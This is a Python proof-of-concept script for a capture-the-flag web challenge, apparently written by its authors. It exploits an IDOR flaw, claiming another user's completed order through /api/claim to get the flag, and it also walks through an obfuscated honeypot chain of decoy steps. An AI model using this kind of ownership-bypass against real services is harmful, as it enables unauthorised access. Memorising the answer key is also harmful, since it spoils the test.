#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# kan-yi-dao 利用链 PoC（出题方复现用，玩家不可见）
#
# 真实链（IDOR 水平越权，唯一通向真 flag 的路径）：
#   1. 考生砍一刀建立会话（自己的单号 1000~9999，服务端下发 sid）
#   2. GET /api/rank：35 条乱序榜单，按 rank 字段排序
#      -> rank=1「砍神_阿伟」status=已结束 remaining=0.0 order_id=99999
#   3. POST /api/claim {"order_id": 99999}：服务端只查订单表、不校验归属人
#      -> 冒领成功，真 flag（梗：冒领别人的快递）
#
# 蜜罐链（被诱捕视角，演示陷阱行为；碎片流永缺闭括号，不通向真 flag）：
#   首页零宽位流指路 /api/v2/pickup
#   -> G1 浏览器 UA 403+Base64「请用 curl」-> G2 curl 无头 401+Base32「补头」
#   -> G3 值错 403+GBK 乱码「当班码 1」-> G4 碎片流：首段 hctf{w0w_ 大钩子，
#      末段（校验位 '}'）永远在生成队列；另 TRACK.tok（XOR90+Base64）
#      解出同一串完整假 flag（localStorage 篡改出口）
#
# 用法：python exp.py [base_url]        默认 http://127.0.0.1:8931
import base64
import http.client
import json
import re
import socket
import sys
import time
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8931"
HP_PATH = "/api/v2/pickup"
HP_HEADER = "X-Staff-Verify"


def req(method, path, body=None, cookie=None):
    data = json.dumps(body).encode() if isinstance(body, dict) else None
    r = urllib.request.Request(BASE + path, data=data, method=method)
    if data is not None:
        r.add_header("Content-Type", "application/json")
    if cookie:
        r.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read(), resp.headers.get("Set-Cookie")
    except urllib.error.HTTPError as e:
        return e.code, e.read(), e.headers.get("Set-Cookie")


def hp_req(ua, headers=None, timeout=20):
    u = urllib.parse.urlparse(BASE)
    conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=timeout)
    h = dict(headers or {})
    if ua is not None:
        h["User-Agent"] = ua
    conn.request("GET", HP_PATH, headers=h)
    resp = conn.getresponse()
    return resp.status, resp.read(), conn


def zw_decode(s):
    bits = "".join("0" if ch == "\u200b" else "1" for ch in s if ch in "\u200b\u200c")
    raw = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) // 8 * 8, 8))
    return raw.decode("utf-8", "replace")


def stream_for(seconds):
    """以全凭据会话打开碎片流，收集 N 秒（socket 超时钉在剩余预算上）。"""
    u = urllib.parse.urlparse(BASE)
    s = socket.create_connection((u.hostname, u.port or 80), timeout=30)
    s.sendall(("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: curl/8.5.0\r\n%s: 1\r\n\r\n"
               % (HP_PATH, u.hostname, HP_HEADER)).encode())
    f = s.makefile("rb")
    status = f.readline().decode("latin1")
    while True:
        if f.readline() in (b"\r\n", b"\n", b""):
            break
    data, deadline = b"", time.time() + seconds
    while True:
        left = deadline - time.time()
        if left <= 0:
            break
        s.settimeout(left)
        try:
            chunk = f.read1(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    s.close()
    return "HTTP/1.0 200" if " 200 " in status else status, data.decode("utf-8", "replace")


print("kan-yi-dao exploit-chain PoC  @  %s" % BASE)
print("=" * 62)

# ---------- 真实链 ----------
print("\n[*] Step 1  考生砍一刀，建立会话（拿自己的单号与 sid）")
own_order = 3487
code, raw, sc = req("POST", "/api/kan", {"order_id": own_order, "strength": 0.3})
kan = json.loads(raw)
sid = (sc or "").split(";", 1)[0].strip()
print("    > POST /api/kan  {\"order_id\": %d, \"strength\": 0.3}" % own_order)
print("    < %d %s   (sid=%s...)" % (code, json.dumps(kan, ensure_ascii=False)[:96], sid[:10]))

print("\n[*] Step 2  拉取榜单（前端加载时自行调用，network 面板可见），按 rank 排序")
code, raw, _ = req("GET", "/api/rank", cookie=sid)
rows = json.loads(raw).get("list", [])
top = min(rows, key=lambda x: x.get("rank", 99))
print("    > GET /api/rank   -> %d 条乱序" % len(rows))
print("    < rank=1  %s  %s  remaining=%s  order_id=%d"
      % (top["name"], top["status"], top["remaining"], top["order_id"]))

print("\n[*] Step 3  水平越权：冒领榜单 rank=1 的已完成订单")
victim = top["order_id"]
code, raw, _ = req("POST", "/api/claim", {"order_id": victim}, cookie=sid)
r = json.loads(raw)
print("    > POST /api/claim  {\"order_id\": %d}   (订单归属人另有其人)" % victim)
print("    < %d %s" % (code, json.dumps(r, ensure_ascii=False)))
real_flag = r.get("flag", "")
print("\n" + "=" * 62)
print("[+] REAL FLAG: %s" % real_flag if re.fullmatch(r"hctf\{[^}]+\}", real_flag)
      else "[-] exploit chain failed: %s" % json.dumps(r, ensure_ascii=False))

# ---------- 蜜罐链（被诱捕视角） ----------
print("\n" + "-" * 62)
print("honeypot chain (trapped-player view, NOT the solve):")

print("\n[*] H0  首页源码零宽位流（人眼不可见）解码")
code, raw, _ = req("GET", "/")
lure = zw_decode(raw.decode("utf-8", "replace"))
print("    < %s" % lure)

print("\n[*] H1  浏览器访问 /api/v2/pickup -> 被拦，提示用 curl（Base64 遮掩）")
code, raw, conn = hp_req("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0"); conn.close()
print("    < %d  %r" % (code, raw[:48]))
print("      base64 -d -> %s" % base64.b64decode(raw).decode("utf-8", "replace"))
time.sleep(2)

print("\n[*] H2  换 curl 重访，缺校验头（Base32 遮掩）")
code, raw, conn = hp_req("curl/8.5.0"); conn.close()
print("    < %d  %r" % (code, raw[:48]))
print("      base32 -d -> %s" % base64.b32decode(raw).decode("utf-8", "replace"))
time.sleep(2)

print("\n[*] H3  补头但值错，GBK 字节冒充 utf-8（终端乱码，iconv 还原）")
code, raw, conn = hp_req("curl/8.5.0", {HP_HEADER: "0"}); conn.close()
print("    < %d  %r   (raw GBK bytes)" % (code, raw[:40]))
print("      iconv -f GBK -t UTF-8 -> %s" % raw.decode("gbk"))
time.sleep(2)

print("\n[*] H4  凭据齐全，碎片流（芝诺间隔 8s/15s/29s/...，末段永不下发），观察 22 秒")
status, text = stream_for(22)
frags = "".join(re.findall(r"第 \d+/\d+ 段：(\S+)", text))
print("    < %s" % status)
for line in text.strip().splitlines():
    print("      %s" % line)
print("      ......")
print("    已到手碎片拼接: %s   <- 永远缺末段（校验位 '}' 在生成队列里）" % frags)

print("\n[*] H5  另一出口：前端 TRACK.tok（XOR90+Base64）")
code, raw, _ = req("GET", "/")
home = raw.decode("utf-8", "replace")
tok = re.search(r"[\"']?tok[\"']?\s*:\s*'([^']+)'", home).group(1)
mk = re.search(r"[\"']?k[\"']?\s*:\s*(0x[0-9a-fA-F]+|\d+)", home)
decoy = "".join(chr(b ^ int(mk.group(1), 0)) for b in base64.b64decode(tok))
print("    < %s  （与碎片流同串；判分对比注入值应判错）" % decoy)

sys.exit(0 if re.fullmatch(r"hctf\{[^}]+\}", real_flag) else 1)
